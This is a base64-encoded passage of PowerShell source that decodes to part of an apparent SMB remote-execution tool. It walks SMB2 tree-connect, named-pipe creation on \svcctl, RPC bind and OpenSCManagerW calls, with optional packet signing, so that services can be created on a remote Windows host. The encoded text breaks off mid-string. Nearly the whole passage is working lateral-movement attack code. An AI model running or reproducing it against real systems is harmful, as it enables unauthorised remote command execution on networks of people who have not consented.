ICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0V4aXQnDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmKCRTTUJFeGVjX2ZhaWxlZCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEJSRUFLIFNNQl9leGVjdXRlX2xvb3ANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIH0NCg0KICAgICAgICB9ICANCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICANCiAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1RyZWVDb25uZWN0Jw0KDQogICAgICAgICAgICA6U01CX2V4ZWN1dGVfbG9vcCB3aGlsZSAoJFNNQl9jbGllbnRfc3RhZ2UgLW5lICdleGl0JykNCiAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgICAgIHN3aXRjaCAoJFNNQl9jbGllbnRfc3RhZ2UpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICdUcmVlQ29ubmVjdCcNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAxDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwMywweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0ZsYWdzIl0gPSAweDA4LDB4MDAsMHgwMCwweDAwICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJUcmVlQ29ubmVjdFJlcXVlc3QgJFNNQl9wYXRoX2J5dGVzDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduID0gJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkU01CMl9zaWduYXR1cmVbMC4uMTVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUIyX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0NyZWF0ZVJlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfdHJlZV9JRCA9IDB4MDEsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmFtZWRfcGlwZV9ieXRlcyA9IDB4NzMsMHgwMCwweDc2LDB4MDAsMHg2MywweDAwLDB4NjMsMHgwMCwweDc0LDB4MDAsMHg2YywweDAwICMgXHN2Y2N0bA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAxDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwNSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfRmxhZ3MiXSA9IDB4MDgsMHgwMCwweDAwLDB4MDAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMkNyZWF0ZVJlcXVlc3RGaWxlICRTTUJfbmFtZWRfcGlwZV9ieXRlcw0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGFbIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9TaGFyZV9BY2Nlc3MiXSA9IDB4MDcsMHgwMCwweDAwLDB4MDAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9kYXRhICANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ24gPSAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkU01CMl9zaWduYXR1cmVbMC4uMTVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUIyX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JQQ0JpbmQnDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ1JQQ0JpbmQnDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmFtZWRfcGlwZV9ieXRlcyA9IDB4NzMsMHgwMCwweDc2LDB4MDAsMHg2MywweDAwLDB4NjMsMHgwMCwweDc0LDB4MDAsMHg2YywweDAwICMgXHN2Y2N0bA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9maWxlX0lEID0gJFNNQl9jbGllbnRfcmVjZWl2ZVsxMzIuLjE0N10NCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDksMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lEDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMA0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0ZsYWdzIl0gPSAweDA4LDB4MDAsMHgwMCwweDAwICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJXcml0ZVJlcXVlc3QgJFNNQl9maWxlX0lEDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YVsiU01CMldyaXRlUmVxdWVzdF9MZW5ndGgiXSA9IDB4NDgsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDQmluZCAxIDB4YjgsMHgxMCAweDAxIDB4MDAsMHgwMCAkU01CX25hbWVkX3BpcGVfVVVJRCAweDAyLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQjJfZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ24gPSAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJEhNQUNfU0hBMjU2LkNvbXB1dGVIYXNoKCRTTUIyX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJFNNQjJfc2lnbmF0dXJlWzAuLjE1XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CMl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnT3BlblNDTWFuYWdlclcnDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAnUmVhZFJlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gJFNsZWVwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDENCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA4LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0Q2hhcmdlIl0gPSAweDEwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9GbGFncyJdID0gMHgwOCwweDAwLDB4MDAsMHgwMCAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyUmVhZFJlcXVlc3QgJFNNQl9maWxlX0lEDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduID0gJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkU01CMl9zaWduYXR1cmVbMC4uMTVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUIyX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMi4uMTVdKSAtbmUgJzAzLTAxLTAwLTAwJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICRTTUJfY2xpZW50X3N0YWdlX25leHQNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdTdGF0dXNQZW5kaW5nJw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAnU3RhdHVzUGVuZGluZycNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMi4uMTVdKSAtbmUgJzAzLTAxLTAwLTAwJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICRTTUJfY2xpZW50X3N0YWdlX25leHQNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICdPcGVuU0NNYW5hZ2VyVycNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCA9IDMwDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwOSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfRmxhZ3MiXSA9IDB4MDgsMHgwMCwweDAwLDB4MDAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01PcGVuU0NNYW5hZ2VyVyAkU01CX3NlcnZpY2VfYnl0ZXMgJFNNQl9zZXJ2aWNlX2xlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCAkU01CX2ZpbGVfSUQgJFNDTV9kYXRhLmxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLmxlbmd0aCAwIDAgMHgwMSwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwZiwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUIyX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbiA9ICRTT